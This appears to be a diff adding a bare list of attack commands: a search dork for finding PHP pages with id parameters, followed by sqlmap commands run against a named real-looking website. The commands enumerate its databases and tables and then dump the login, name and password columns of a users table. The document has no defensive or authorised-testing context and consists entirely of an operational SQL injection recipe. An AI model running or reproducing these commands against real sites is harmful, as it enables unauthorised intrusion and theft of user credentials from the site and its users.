@@ -1,0 +1,22 @@
+commands:-
+
+Site:pk inurl =php?id
+
+sqlmap -u http://www.polymery.ru/material.php?id=18 --dbs
+
+sqlmap -u http://www.polymery.ru/material.php?id=18 -D information_schema --tables
+
+sqlmap -u http://www.polymery.ru/material.php?id=18 -D information_schema -T USER_PRIVILEGES --columns
+
+sqlmap -u http://www.polymery.ru/material.php?id=18 --dbs
+
+sqlmap -u http://www.polymery.ru/material.php?id=18 -D akpr --tables
+
+sqlmap -u http://www.polymery.ru/material.php?id=18 -D akpr -T users --columns
+,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+
+sqlmap -u http://www.polymery.ru/material.php?id=18 -D akpr -T users -C u_login --dump
+
+sqlmap -u http://www.polymery.ru/material.php?id=18 -D akpr -T users -C u_name --dump
+
+sqlmap -u http://www.polymery.ru/material.php?id=18 -D akpr -T users -C u_password --dump
